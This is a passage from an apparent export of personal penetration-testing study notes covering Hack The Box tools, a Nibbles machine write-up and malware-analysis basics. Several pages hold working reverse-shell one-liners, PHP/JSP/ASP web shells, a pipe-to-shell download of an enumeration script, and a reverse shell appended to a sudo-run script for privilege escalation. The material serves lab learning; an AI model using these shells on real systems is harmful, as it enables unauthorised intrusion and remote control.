-echo\n$fg\n \n[Enter]\n[Enter]"},"HTB/FTP":{"slug":"HTB/FTP","filePath":"HTB/FTP.md","title":"FTP","links":["tags/file-transfer"],"tags":["file-transfer"],"content":"tags: file-transfer\nThe FTP server enables a client to exchange files between devices. It also enables clients to manage files remotely by sending file management commands such as delete or rename. To accomplish this, the FTP service uses two different ports to communicate between client and server.\nTo begin an FTP session, control connection requests are sent to the server using destination TCP port 21. When the session is opened, the server uses TCP port 20 to transfer the data files.\nInfo\nThe default port for ftp is 21.\nWe can login as anonymous if not restricted by the owner.\nSyntax:\nftp -p 10.129.42.253\nCommands\n\n?: To see help menu\nGet: To download files to our local system\nPut: To upload file to remote server\nExit: To exit ftp session.\ncd: Change directory\ndir: List directories\nrename: Rename a file/dir\n"},"HTB/Gobuster":{"slug":"HTB/Gobuster","filePath":"HTB/Gobuster.md","title":"Gobuster","links":["tags/web","tags/Reconnaissance","HTB/http-response-code","HTB/Wordlists","HTB/Seclist"],"tags":["web","Reconnaissance"],"content":"tags: web Reconnaissance\nGobuster is a web enumeration tool.\nDirectory/File Enumeration\nWe can use dir flag for directory enumeration.\nSyntax\n\tgobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;\nIt returns various http response code for each directory which was found and can be accessed manually.\nWe can use various Wordlists for this attack such as /usr/share/wordlists/dirb/common.txt.\nDNS Subdomain Enumeration\nWe can use dns flag for subdomain enumeration. For wordlist we can use Seclist which has lists for subdomains."},"HTB/JavaScript-Deobfuscation":{"slug":"HTB/JavaScript-Deobfuscation","filePath":"HTB/JavaScript Deobfuscation.md","title":"JavaScript Deobfuscation","links":["tags/web"],"tags":["web"],"content":"web\nThe js files are minified into .min.js to hide the functions and data. To return them to their original form we have to use a deobsfuscator.\nWe can use Online Deobsfuscator such as de4js to decode the files.\nAfter deobfuscation we can see how functions are implemented, call them using console and so on."},"HTB/Logging-of-Commands":{"slug":"HTB/Logging-of-Commands","filePath":"HTB/Logging of Commands.md","title":"Logging of Commands","links":[],"tags":[],"content":"To display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Logging":{"slug":"HTB/Logging","filePath":"HTB/Logging.md","title":"Logging","links":["tags/setup"],"tags":["setup"],"content":"setup\nTo display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Metasploit":{"slug":"HTB/Metasploit","filePath":"HTB/Metasploit.md","title":"Metasploit","links":["HTB/Searchsploit"],"tags":[],"content":"Metasploit Framework (MSF) is a tool which contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.\nTo use metasploit we need to learn the name of exploit that can be used against the service. this can be done using tools like Searchsploit.\nCommands\n1. msfconsole:\nTo start metasploit\nmsfconsole\n2. search exploit\nsearch exploit &lt;exploit&gt;\ne.g. when we search for exploit eternalblue we get output exploit/windows/smb/ms17_010_psexec along with other details.\n3. use exploit\nuse &lt;full name of exploit&gt;\ne.g. use exploit/windows/smb/ms17_010_psexec\n4. show options\nTo show config items before using an exploit. The items having required value set to zero must be set before running exploit.\n5. set &lt;option&gt;\nTo set value of a option.\nExample:\nset RHOSTS 1.1.1.1\n6. check\nTo check if exploit works without actually compromising the system."},"HTB/Nmap":{"slug":"HTB/Nmap","filePath":"HTB/Nmap.md","title":"Nmap","links":["tags/Reconnaissance","locate"],"tags":["Reconnaissance"],"content":"Reconnaissance\nParameters\n\n-sC: Run default scripts and obtain more detailed info\n-sV: Version scan\n-p-: Scan all ports\n-T:\n\n-T1: Slowest\n-T5: Physcho\n\n\n-Pn: Ping probe\n-oA: Output all to file\n \n\n\nnmap -oA outputfile 1.1.1.1\n```\nUsage\nnmap -sC -sV 1.1.1.1\nScripts\nThe syntax for running an Nmap script is `nmap —script  -p&lt;port&gt; &lt;host&gt;‘.\n1. We can locate scripts using locate:\nlocate scripts/citrix\n2. Then to run the script:\nnmap --script=&quot;my_script&quot; -p 224 1.1.1.1"},"HTB/Privilege-Escalation":{"slug":"HTB/Privilege-Escalation","filePath":"HTB/Privilege Escalation.md","title":"Privilege Escalation","links":["reverse-shell","SSH"],"tags":[],"content":"1. Enumeration Scripts\n\nPEAS\n\nLinPEAS\n\n \n\n\ncurl -L github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\t- WinPEAS\n\n# 2. SUDO\nThe `sudo` command can be used to run command to escalate privilege. We can check what `sudo` privilege we have using `sudo -l`. Most commands require user `password` but some can be ran as root without entering user password. These applications have `NOPASSWD` entry.\n```shell\n$ sudo -l\n\n    (user : user) NOPASSWD: /bin/echo\n\nWe can run that command using the shown user without entering password:\n$ sudo -u user /bin/echo Hello World!\n \n    Hello World!\nThis process can be automated using tools such as GTFObins for Linux and LOLBAS for windows.\n3. Scheduled Tasks\nThere are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:\n\nAdd new scheduled tasks/cron jobs\nTrick them to execute a malicious software\n\nThere are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:\n\n/etc/crontab\n/etc/cron.d\n/var/spool/cron/crontabs/root\n\nIf we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.\n4. Exposed Credentials\nWe can also find user passwords exposed in configuration files, logs and history files (bash_history) if we have read access to them.\n5. SSH Keys\nIf we have access to .ssh directory, we can read private keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa,  we can copy it to our machine and use the -i flag to log in with it:\nvim id_rsa\nchmod 600 id_rsa\nssh root@10.10.10.10 -i id_rsa\nCommands for specific applicaton\nPHP\nSummon bash\nsudo php -r &#039;system(&quot;/bin/bash&quot;);&#039;"},"HTB/Remote-Shells":{"slug":"HTB/Remote-Shells","filePath":"HTB/Remote Shells.md","title":"Remote Shells","links":["HTB/Reverse-Shell","HTB/Bind-Shell","HTB/Web-Shell"],"tags":[],"content":"Types of Remote Shell\n1. Reverse Shell\nConnects back to our system and gives us control through a reverse connection.\n2. Bind Shell\nWaits for us to connect to it and gives us control once we do.\n3. Web Shell\nCommunicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output."},"HTB/Reverse-Shell":{"slug":"HTB/Reverse-Shell","filePath":"HTB/Reverse Shell.md","title":"Reverse Shell","links":["Netcat"],"tags":[],"content":"Netcat Listener\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlagDescription-lListen mode, to wait for a connection to connect to us.-vVerbose mode, so that we know when we receive a connection.-nDisable DNS resolution and only connect from/to IPs, to speed up the connection.-p 1234Port number netcat is listening on, and the reverse connection should be sent to.\nUsage\nnc -nvlp &lt;port&gt;\nReverse Shell Commands\nFor bash\nbash -c &#039;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#039;\nFor bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\nFor Powershell\npowershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#039;10.10.10.10&#039;,1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#039;PS &#039; + (pwd).Path + &#039;&gt; &#039;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;"},"HTB/SID":{"slug":"HTB/SID","filePath":"HTB/SID.md","title":"SID","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nSID is a unique identifier of a user which is assigned when a user logs in and has all permissions assigned to it.\ne.g. S-1-5-21-2614195641-1726409526-3792725429-1006\nFinding SID\nCurrent user\nSID of current user can be found using the whoami command.\nwhoami /user\nOther users\nBut for user not logged in, we need to user Get-WmiObject Command.\n Get-WmiObject -Class Win32_UserAccount -filter &quot;name=&#039;Jim&#039;&quot;\nOR\n(Get-Localuser username).SID\nFor Security Group\nGet-WMIObject win32_group -filter &quot;name=&#039;NameOfGroup&#039;&quot;\nOR\n(Get-Localgroup $GroupName).SID"},"HTB/SMB":{"slug":"HTB/SMB","filePath":"HTB/SMB.md","title":"SMB","links":["tags/windows","tags/file-transfer","HTB/Nmap","HTB/Smbclient"],"tags":["windows","file-transfer"],"content":"windows file-transfer\nServer Message Block (SMB)\nEnumerating SMB\nNmap has many scripts for enumerating smb such as smb-os-discovery.nse\nnmap --script smb-os-discovery.nse 1.1.1.1\nShares\nSo smb allows users to share folders (hence called shares) which can be accessed and enumerated using Smbclient in linux."},"HTB/Searchsploit":{"slug":"HTB/Searchsploit","filePath":"HTB/Searchsploit.md","title":"Searchsploit","links":["HTB/Metasploit"],"tags":[],"content":"Searchsploit is a tool used to search for public vulnerabilities against a service which can then be used in Metasploit to attack the target\nInstallation\nsudo apt install exploitdb -y\nUsage\nsearchsploit &lt;application&gt; &lt;version&gt;\nExample\nsearchsploit openssh 7.2"},"HTB/Seclist":{"slug":"HTB/Seclist","filePath":"HTB/Seclist.md","title":"Seclist","links":["HTB/Wordlists"],"tags":[],"content":"Seclist is a Wordlists repository.\nInstallation\n1. Using Git\ngit clone github.com/danielmiessler/SecLists\n2. Using apt\nsudo apt install seclists -y"},"HTB/Security-Group":{"slug":"HTB/Security-Group","filePath":"HTB/Security Group.md","title":"Security Group","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nIn Windows, groups can be defined to better manage permissions of users\nCreating a security group\nNew-LocalGroup -Name &quot;Group1&quot; -Description &quot;The new group&quot;\nAdd users to the group\nAdd-LocalGroupMember -Name Group1 -Member Jim"},"HTB/Services":{"slug":"HTB/Services","filePath":"HTB/Services.md","title":"Services","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nWindows services are programs that run in the background.\nTo list services\nGet-Service | Where-Object {$_.Status -eq &quot;Running&quot;}\nOutput to a csv file\nGet-Service | Out-File -FilePath &quot;Services.txt&quot;"},"HTB/Smbclient":{"slug":"HTB/Smbclient","filePath":"HTB/Smbclient.md","title":"Smbclient","links":["HTB/SMB","tags/file-transfer"],"tags":["file-transfer"],"content":"References: SMB\nTags: file-transfer\nsmbclient is a tool to enumerate and interact with smb shares.\nFlags\n\n-N : suppress password prompt\n-L : list available shares\n\nCommand\nsmbclient -N -L \\\\\\\\1.1.1.1\nConnecting to a share\n1. Connect as a guest\nsmbclient \\\\\\\\1.1.1.1\\\\users\n2. Connect as a specific user\nsmbclient -U Bob \\\\\\\\1.1.1.1\\\\users\nCommands\n\nGet: To download files to our local system\nExit: To exit ftp session.\nls: To list dir\n"},"HTB/Transferring-Files":{"slug":"HTB/Transferring-Files","filePath":"HTB/Transferring Files.md","title":"Transferring Files","links":["tags/file-transfer","cURL"],"tags":["file-transfer"],"content":"file-transfer\n1. Using wget or cURL\nFirst we have to start a python server on directory containing the file we need to upload\npython3 -m http.server 8000\nThen we can use wget or curl to download the file from victim system\nwget http://&lt;our_ip&gt;:8000/&lt;file_name&gt;\ncurl http://&lt;our_ip&gt;:8000/&lt;file_name&gt; -o &lt;output_file_name&gt;\n2. Using scp\nIf we have obtained ssh user credentials on the remote host. We can do so as follows:\nscp &lt;our_filename&gt; user@remotehost:/dir/&lt;out_filename&gt;\n3. Using Base64\nTo bypass firewall and av we can encode our file before sending and decode on victim system.\nFor example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:\nbase64 shell -w 0\nNow, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:\necho &lt;encoded_string&gt; | base64 -d &gt; shell"},"HTB/User-Creation":{"slug":"HTB/User-Creation","filePath":"HTB/User Creation.md","title":"User Creation","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nCreate a new user\nNew-LocalUser -Name &#039;Bob&#039; -NoPassword\nAssign user to a Security Group\nAdd-LocalGroupMember -Name Group1 -Member Bob"},"HTB/Web-Shell":{"slug":"HTB/Web-Shell","filePath":"HTB/Web Shell.md","title":"Web Shell","links":["HTB/Webroot","cURL"],"tags":[],"content":"A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.\nWriting a Web Shell\nWe need to write our web shell that would take our command through a GET request, execute it, and print its output back.\nSome common web shells:\nFor php\n&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;\nFor jsp\n&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;\nFor asp\n&lt;% eval request(&quot;cmd&quot;) %&gt;\nUploading a web shell\nWe need to have our web shell in the remote server’s Webroot to execute it. We can either upload our shell such as shell.php to the server using file upload vulnerability or directly write our shell using command execution vulnerability\nWriting a web shell\nFor apache Webroot\necho &#039;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#039; &gt; /var/www/html/shell.php\nAccessing Web shell\n1. Visiting the webpage\nTo run a command we can visit our shell.php page and use ?cmd=id to execute id command.\nExample url: http://SERVER_IP:PORT/shell.php\n2. Using cURL\ncurl http://SERVER_IP:PORT/shell.php\nGreatness of Web Shell\n\nIt can bypass any firewall (uploading shell might trigger tho) as we are using existing port to run command using existing service to summon a shell.\nEven if host is rebooted the shell is intact.\n\nSadness of Web Shell\n\nIts easy to detect as any sane person/antivirus can notice a shell.php in root directory.\nIts is not interactive as we need to send requests for command each time tho we can automate and make it semi automatic but its not as good.\n"},"HTB/Webroot":{"slug":"HTB/Webroot","filePath":"HTB/Webroot.md","title":"Webroot","links":[],"tags":[],"content":"The following are the default webroots for common web servers:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWeb ServerDefault WebrootApache/var/www/html/Nginx/usr/local/nginx/html/IISc:\\inetpub\\wwwroot\\XAMPPC:\\xampp\\htdocs\\"},"HTB/Wordlists":{"slug":"HTB/Wordlists","filePath":"HTB/Wordlists.md","title":"Wordlists","links":["HTB/Seclist"],"tags":[],"content":"Default Wordlist\nDirectory: /usr/share/wordlist\nTree\nExternal List\n1. Seclist"},"HTB/http-codes":{"slug":"HTB/http-codes","filePath":"HTB/http codes.md","title":"http codes","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/http-response-code":{"slug":"HTB/http-response-code","filePath":"HTB/http response code.md","title":"http response code","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/ssh":{"slug":"HTB/ssh","filePath":"HTB/ssh.md","title":"ssh","links":[],"tags":[],"content":"Secure shell"},"Machines/EscapeTwo":{"slug":"Machines/EscapeTwo","filePath":"Machines/EscapeTwo.md","title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Machines/Nibbles":{"slug":"Machines/Nibbles","filePath":"Machines/Nibbles.md","title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd            (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Malware-Analysis/Analyzing-Imports--and--Exports":{"slug":"Malware-Analysis/Analyzing-Imports--and--Exports","filePath":"Malware Analysis/Analyzing Imports & Exports.md","title":"Analyzing Imports & Exports","links":[],"tags":[],"content":"What is Imports and Exports?\nImports refers to the functions imported by a Windows executable from DLL.\nExports refers to all functions exported by a given DLL.\nSignificance of Imports and Exports in Static Malware Analysis\nIn static malware analysis of Windows executable files, examining imports and exports is crucial. This is because insights about the behavior of the malware can be gained based on DLL files and their contained functions. For example, information about certain DLLs is demonstrated in the visual below:\n\nThe DLLs seen in the above image are likely to be used by the malware. For example, the “User32.dll” file is a DLL used for performing operations that require user interaction. Clicking on the displayed icons and locking the screen are examples of actions that can be performed using this DLL.\nViewing Imports and Exports\nThere are several tools available to view imports and exports. In this section of the training, the “PE Studio” tool is used to view the imports and exports of Windows malware files.\nYou can access the “PE Studio” tool at the following address:\nPE Studio: www.winitor.com/download \nLet’s examine the imports of malware:\n\nThe image above shows which functions are imported from which DLL. The tasks performed by these functions provide information about the malware’s behavior. Similarly, exports can also be examined.\n\nSince this malware does not have any exports, the PE Studio tool has provided an empty output as shown above."},"Malware-Analysis/Basic-Concepts":{"slug":"Malware-Analysis/Basic-Concepts","filePath":"Malware Analysis/Basic Concepts.md","title":"Basic Concepts","links":[],"tags":[],"content":"What is Compiling and Decompiling?\nCompiling is the process that enables the source code of the programming language to run on the target system. A compiled source code transforms into binary type machine code. The extension of such files on Windows is “.exe”.\n\nDecompiling is the process of obtaining the source code from the executable file. Decompiling cannot be done easily in every programming language because software manufacturers do not want the source codes of their software to be revealed. In order for the source code not to be revealed out through decompiling, vendors take advantage of different features of the programming languages and some other techniques while developing the software. This makes it much more difficult to implement the reverse engineering processes of the software.\nAs an example, the executable file will be decompiled in order to obtain the source code of an executable file written in C# programming language without anti-reversing techniques applied below. Some of the tools that can be used for this are:\n\nILSpy - github.com/icsharpcode/ILSpy \ndotPeek - www.jetbrains.com/decompiler/\n.NET Reflector - www.red-gate.com/products/dotnet-development/reflector/ \nJustDecompile - github.com/telerik/justdecompileengine \n\nC# Binary Decompile Example with ILSpy Tool\nWe will use the “ILSpy” tool in this example to decompile the executable file written in C# programming language. This is a tool that runs on Windows systems and has a graphical user interface (GUI). You can access the non-installation file of the ILSpy tool using the link below:\nILSpy: github.com/icsharpcode/ILSpy/releases/download/v8.0-preview3/ILSpy_binaries_8.0.0.7246-preview3.zip \nNote: “.NET 6.0” must be installed on your Windows system in order to be able use the ILSpy tool on the link above. “ILSpy” and “.NET 6.0” installation files are located in the “CourseFiles” directory in the Linux system, which is included in the following parts of the training.\nLet’s start with the example:\n\nNote: You can access the “LetsDefend.exe” file in the example on the “CourseFiles” directory in the Linux system, which is included in the following parts of the training.\nLet’s run the “LetsDefend.exe” file shown in the image above.\n\nThe window you see above pops open when the program is run. Let’s see what the program does:\n\nAs seen in the image above, the program shows an image when the “Click Me” button is clicked. So, let’s open the “ILSpy” tool to reveal the source code of the program with the decompile process to be able to reveal how this happens or through what code it does happen.\n\nThe window you see above will pop open when the ILSpy tool is run.\n\nWe can upload our file to the program using “File → Open” option.\n\nAs you can see the image above, the decompile process starts and after the program is uploaded into the ILSpy tool. We can use the navigation menu on the left to see what happens when the button is clicked through the source code:\n\nAs seen in the source code in the image above, the invisible picture box becomes visible when the button is clicked.\nWe have obtained the source code of the program which was written in C# language with the help of the ILSpy tool and the exact function of the button in the code was revealed.\nWhat is Assembler and Disassembler?\nAssembler is a compiler that converts the source code written in assembly language to machine code.\n\n“The Netwide Assembler (NASM)”, is an example of an assembler:\nThe Netwide Assembler (NASM): www.nasm.us/\nDisassembler is a tool that helps acquire the assembly code of the executable binary file.\n\nExamples of disassembler include:\n\nIDA Pro (Windows &amp; Linux) - www.hex-rays.com/ida-pro/ \nHopper Disassembler (Linux) - www.hopperapp.com/ \nBinary Ninja - binary.ninja/ \nObjdump (Linux) - man7.org/linux/man-pages/man1/objdump.1.html \n\nWhat is Debugging and Debugger?\nDebugging is the in-depth analysis process in order to see the detailed and step-by-step operations of the programs during operation. Debugging can be done for many different purposes. For example, it can be used to test the program. If debugging is applied within the scope of reverse engineering, the aim is to learn the flow of the program and to reveal its processes. Debugging can be done in high-level programming languages such as C#, as well as in low-level languages such as Assembly.\nSpecial programs are needed for debugging that are also known as “debuggers”. For example, a debugger can be used in the “Visual Studio” software for debugging C# source codes. There are different debugger tools specific to each operating system in order to perform debugging at the Assembly language level. Below are some of the debuggers:\n\nOllyDbg (Windows) - www.ollydbg.de/ \nImmunityDebugger (Windows) - www.immunityinc.com/products/debugger/ \nGDB (Linux) - www.sourceware.org/gdb/ \nIDA Pro (Windows &amp; Linux) - hex-rays.com/ida-pro/ \nX64dbg (Windows) - x64dbg.com/ \nWindbg (Windows) - 